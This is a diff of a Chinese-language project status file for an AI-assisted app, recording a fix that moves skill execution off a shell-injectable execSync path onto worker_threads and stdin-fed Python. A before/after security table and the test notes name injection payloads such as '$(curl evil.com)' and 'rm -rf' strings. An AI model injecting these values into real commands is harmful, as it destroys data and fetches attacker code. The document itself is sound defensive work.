@@ -2,7 +2,7 @@
 
 > **用途**：新开 AI 对话时，让 AI 读这一份文件即可同步项目完整状态。
 > **维护约定**：每完成一个开发轮次（Round），更新「开发进度」「测试状态」「下一步」三节。
-> **最后更新**：2026-05-19（M5 完成 — channel inbound 消息自动经 chat 引擎回复,前端 per-channel Switch 开关;顺手修复 reply_to chat_id 丢失 bug）
+> **最后更新**：2026-05-19（M6a 完成 — Skill 执行从 `execSync(node -e ...)` 切到 worker_threads,消除 shell injection 通道 + 可终止 timeout + 内存上限;M6b 桌面壳推迟独立轮次）
 
 ---
 
@@ -644,7 +644,110 @@ frontend   vitest run                                    → 120 files / 1201 pa
 - ❌ 流式回复到 channel(Telegram 不支持逐字流,Discord 支持但需要编辑消息;大多数 IM 期望整段回复)
 - ❌ 回复延迟控制(防止机器人回复过快显得不真实)
 
-### 6.11 自学习闭环的物理路径（已全线打通）
+### 6.11 M6a — Skill 执行隔离(worker_threads + spawn+stdin)（本轮）
+
+**勘察到的真实漏洞**:`skill-manager.invokeSkill` 之前的实现是直接 `execSync(\`node -e "${wrapped.replace(/"/g, '\\\\"')}"\`)`,把用户参数 JSON-stringify 后嵌进 shell 命令字符串。**只 escape 双引号是不够的** —— `$`、反引号、`\n`、` ` 等都能突破并执行任意 shell。这是个 trivial 的 RCE 通道,只要谁能控制 invoke 的 params 就能拿到 sub-brain 的 shell。Python 路径同样漏。
+
+**M6a 把这条彻底拆掉**:
+
+**新增 `sub-brain/src/skills/runtime/run-js-skill.ts`(94 行)**:
+
+- 用 `node:worker_threads.Worker(source, {eval: true})` 模式跑 JS skill
+- **params 通过 `workerData` 结构化克隆传递,不接触 shell**
+- 用户代码包在 `new Function("params", "return (async () => { ... })()")` —— 支持 top-level await,同时把 user scope 与 worker scope 隔离
+- `resourceLimits.maxOldGenerationSizeMb`(默认 256MB)V8 硬上限,OOM 时 worker 自动 exit
+- timeout 默认 30s,floor 100ms;到点强 `worker.terminate()`
+- worker 异常 / OOM / 主动超时 → 返回 `{ok:false, error, timedOut?, durationMs}`,**永不抛出**
+- 每次调用新建 worker,无 global state 泄漏(测试验证 `globalThis.__leaked` 不跨 invocation)
+
+**新增 `sub-brain/src/skills/runtime/run-python-skill.ts`(73 行)**:
+
+- Python 没法在进程内沙箱化,继续走 `spawn("python3", ["-c", wrapped])`
+- **但 params 改走 stdin JSON**,`json.load(sys.stdin)` 在 wrapper prelude 里读
+- timeout 到点 `child.kill("SIGKILL")`
+- exit code 0 → stdout 是 result;非 0 → stderr 是 error,stdout fallback
+- stdout 输出末尾 newline 自动 trim
+- 失败原因永远 in-band,**永不抛出**
+
+**`skill-manager.ts` invokeSkill 重写**:
+
+之前 38 行包含双重 escape + try/catch 的 execSync 路径,现在 21 行,语言分支只调对应 runner,把 `{ok, result, error}` 结果折回 `SkillInvocation` 统计逻辑。
+
+```typescript
+if (skill.language === "python") {
+  const r = await runPythonSkill({ code: skill.code, params });
+  if (r.ok) { result = r.result; success = true; }
+  else { error = r.error; result = error; }
+} else if (skill.language === "javascript" || skill.language === "typescript") {
+  const r = await runJsSkill({ code: skill.code, params });
+  // ...
+} else {
+  error = `unsupported skill language: ${skill.language}`;
+  result = error;
+}
+```
+
+**测试**:
+
+- `tests/run-js-skill.test.ts`(11 用例):
+  - 同步 return / async return / 抛同步异常 / 抛 async rejection
+  - **shell 元字符 params 原样穿越**(主要安全验证用例)
+  - 嵌套结构 + Unicode + emoji 完整保留
+  - 死循环触发 timeout 且 `<2s` 内真正回归
+  - timeout=0 触发安全 floor(100ms),不立即超时
+  - return undefined → ok=true
+  - 语法错误 → ok=false 带 error
+  - **每次 invocation 新 worker,globalThis 不跨调用泄漏**
+- `tests/run-python-skill.test.ts`(9 用例,自动 skip 若环境没 python3):
+  - stdout normal / multiline / 中文 + emoji
+  - Traceback 进 stderr → 暴露到 error 字段
+  - **shell 元字符 params 不被解释**(rm -rf $HOME exploit 验证)
+  - 死循环 timeout 强杀
+  - 错误 python 路径 → ok=false 而非崩
+  - 嵌套 dict params
+  - stdout trailing newline trim
+
+**运行验收**:
+
+```
+sub-brain  tsc --noEmit                 → 0 errors
+sub-brain  vitest run                   → 35 files / 387 pass(+20)
+```
+
+**安全前后对比**:
+
+| 攻击向量 | M6a 之前 | M6a 之后 |
+|---|---|---|
+| params 含 `\"; rm -rf / #` | **执行任意 shell** | 字符串原样穿越 |
+| params 含 `$(curl evil.com)` | **执行任意 shell** | 字符串原样穿越 |
+| params 含巨大 base64 → JSON | execSync ARG_MAX 截断 | structured clone 无 ARG_MAX |
+| 死循环 skill | execSync 阻塞主线程 30s | 100ms-3600s 可调,worker 异步终止 |
+| 内存爆 skill | 进程被 OOM killer 杀(可能拖死整个 node) | V8 resourceLimit 自杀,主进程不受影响 |
+| skill 写满全局 | 影响其他 skill | 新 worker = 新 V8 isolate |
+
+**故意未做(M6.1 follow-up)**:
+
+- ❌ **文件系统 / 网络沙箱** —— worker 仍可 `require("fs")` 读宿主文件、`require("http")` 联网。built-in skills 真的需要这些(git/docker/ffmpeg 都靠 child_process)。彻底沙箱化需要容器或 vm2 / isolated-vm,有各自 tradeoff
+- ❌ **Module import 白名单** —— 同上,会断掉 built-ins。AI-generated skills 应在 skill-hub 层评审,不靠 runtime 拦
+- ❌ **Per-skill resource quota** —— 当前所有 skill 共用一个默认配置,后续按 trust level 分级
+- ❌ **CPU 时间 vs 真实时间** —— timeout 是 wall-clock,sleep 的 skill 也算时间。要按 CPU 时间需要 `worker.threadId` + `/proc/{tid}/stat` 平台依赖
+
+**M6b 桌面壳延迟到下一轮**:
+
+桌面打包(Tauri/Electron)的实际工作量评估:
+
+- Rust 工具链安装 + Tauri 项目脚手架
+- Sub-brain (Node + pnpm install) 嵌入打包
+- Main-brain (Python venv + sentence-transformers ~500MB) 嵌入打包
+- 跨平台启动脚本(macOS / Linux / Windows)
+- 进程生命周期(主进程退出时清理 sub/main brain)
+- IPC bridge(Tauri Rust ↔ Vite/React renderer ↔ sub-brain HTTP)
+- 系统托盘 / 原生菜单 / 窗口管理
+- 自动更新 / 代码签名(macOS notarization,Windows authenticode)
+
+诚实估计 2-3 周独立工程,与当前路径不同。Roadmap **M6 收官保持 M6a + M6b 两半,M6b 单独排期**。
+
+### 6.12 自学习闭环的物理路径（已全线打通）
 
 ```
 main-brain 后台任务 _skill_evolution_scheduler（每 1h）
@@ -693,12 +796,14 @@ main-brain python -m pytest tests/      → 75 pass / 0 fail（自 Round E 起�
 
 | 优先 | 任务 | 说明 |
 |---|---|---|
-| 🔥 | **M6 桌面壳(Tauri/Electron)+ Skill 执行隔离** | 把 webrain 打包成桌面应用,自带 sub-brain/main-brain 启动。Skill 执行从 `node -e` 改 worker_threads 隔离。Roadmap 最后一块。 |
+| 🔥 | **M6b 桌面壳(Tauri)** | 把 webrain 打包成桌面应用,自带 sub-brain/main-brain 启动。Rust 工具链 + venv 嵌入 + 跨平台签名,独立 2-3 周。Roadmap 最后一块。 |
+| 🔥 | M6.1 Skill FS/网络沙箱 | worker_threads 解决了 shell injection,但 skill 仍可 `require("fs")` 读宿主文件。容器或 isolated-vm 二选一。 |
 | 🔥 | M5.1 Channel 高级控制 | per-channel agent_id / 关键词过滤 / 时段限制 / 黑白名单 / 回复延迟模拟。 |
 | 🔥 | M4b.1 MCP 鉴权 + write 工具 | bearer token + 白名单。鉴权落地后开放 `memory_store` / `wiki_create` / `rag_index_file` 等 write 类工具。 |
 | 🔥 | M4a.1 流式 failover | 当前流路径仍用 `get_primary()`,首 chunk 之前若失败需要 failover。需要 stream 启动失败检测 + endpoint 切换。 |
 | 🔥 | M3.5 PlanExecutor 流式进度 | 当前 `/plan/execute` 是同步返回。后续做 SSE,每个 attempt 完成实时推送给前端,UI 显示「task 2/5 第 3 次尝试中...」。 |
 | 📦 | 默认 registry 种子 | 给本地默认 registry 配 1–2 个示范 skill,首次打开 marketplace 不空。 |
+| ✅ | ~~M6a Skill 执行隔离~~ | 完成于 2026-05-19(§6.11)。worker_threads + spawn+stdin 替换 shell-injection 老路径。 |
 | ✅ | ~~M5 Channel inbound → chat 自动回复~~ | 完成于 2026-05-19(§6.10)。 |
 | ✅ | ~~M4b MCP server 暴露~~ | 完成于 2026-05-19(§6.9)。 |
 | ✅ | ~~M4a Multi-LLM failover + 健康面板~~ | 完成于 2026-05-19(§6.8)。 |
